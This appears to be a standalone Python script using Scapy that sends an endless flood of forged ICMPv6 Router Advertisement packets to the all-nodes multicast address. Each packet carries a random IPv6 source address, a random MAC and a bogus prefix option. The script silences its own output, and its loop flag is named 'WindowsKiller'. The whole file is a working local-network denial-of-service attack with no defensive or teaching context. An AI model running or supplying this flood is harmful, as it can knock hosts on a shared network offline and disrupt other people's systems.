#!/usr/bin/env python
from scapy.all import *
from random import seed, getrandbits
from ipaddress import IPv6Network, IPv6Address
from randmac import RandMac
import os
import sys

WindowsKiller = True

while WindowsKiller == True:
    a = IPv6()   
    subnet = '2001:db8:100::/64'
    seed()
    network = IPv6Network(subnet)
    address = IPv6Address(network.network_address + getrandbits(network.max_prefixlen - network.prefixlen))
    source = (address)  
    a.src = source
    a.dst = "ff02::1"
    b = ICMPv6ND_RA()
    c = ICMPv6NDOptSrcLLAddr()
    example_mac = "00:00:00:00:00:00"
    generated_mac = RandMac(example_mac)
    c.lladdr = generated_mac
    d = ICMPv6NDOptMTU()
    e = ICMPv6NDOptPrefixInfo()
    e.prefixlen = 64
    e.prefix = "d00d::"
    send(a/b/c/d/e)
    f = open(os.devnull, 'w')
    sys.stdout = f
